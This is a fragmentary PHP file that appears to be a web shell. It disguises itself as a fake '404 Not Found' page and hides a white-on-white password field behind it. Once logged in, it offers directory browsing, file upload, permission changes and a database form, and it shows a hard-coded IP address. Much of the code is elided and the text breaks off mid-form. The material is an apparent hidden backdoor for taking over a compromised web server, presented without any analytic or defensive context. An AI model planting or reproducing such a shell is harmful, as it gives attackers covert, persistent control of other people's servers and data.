<?php 
	...
	$Getlink = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
	$version = apache_get_version();
	$password = "$2y$10$6FrrTb1rJ5MzDg5OjefnD.yhfOOnOwpcgXQLcsNtgxqCcCd1DlitS";
	...
	if (!isset($_SESSION["Login"])) {
		echo '<title>404 Not found</title><h1>Not Found</h1><p>The Requested URL '.$Getlink.'</p><hr><i>'.$version.'</i><form method="post"><input type="password" style="border:1px solid white;" name="pass"><button type="submit" name="buttonpass" style="border:1px solid white;background:white;color:white;">GO</button></form>';
		exit;
	}
	...
	<?php
		...
		if($open = opendir($Directori)){
			...
			<div class="input-group is-invalid">
			  ...
			  <a class="btn btn-dark" href="home.php" name="Menushell" >RELOAD</a>
			...
			<div class="custom-file">
			 ...
			 <div class="input-group-append">
		       ...
		       <a class="btn btn-dark" href="?reset" name="IP" >182.1.61.5</a>
		    </div>
			</div>		
			</tr></table>
			...
			<div class="Chmod">
				...
				if (isset($_GET["IND"])) {
					...
					echo '	<div class="overlay" id="Permision">
						<a href="home.php" class="close">x</a>
						<div class="box">
							<form class="InputdatabaseKu text-center" method="POST" action="home.php">
								<div class="form-row">
